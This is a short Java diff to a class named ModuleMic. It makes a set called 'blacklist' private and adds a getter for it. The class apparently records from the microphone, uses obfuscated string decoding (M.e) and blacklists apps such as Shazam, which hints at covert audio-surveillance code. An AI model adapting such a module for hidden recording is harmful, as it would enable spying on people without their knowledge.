@@ -72,7 +72,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	private Observer<ProcessInfo> processObserver;
 
-	public Set<String> blacklist = new HashSet<String>();
+	private Set<String> blacklist = new HashSet<String>();
 	private PowerManager pm = null;
 	private int amp_zero_count = 0;
 
@@ -85,6 +85,11 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	public boolean isRecording() {
 		return recorder_started;
 	}
+	
+	public synchronized String[] getBlacklist(){
+		return blacklist.toArray(new String[]{});
+	}
+	
 	public synchronized void resetBlacklist() {
 		blacklist.clear();
 		addBlacklist(M.e("shazam"));
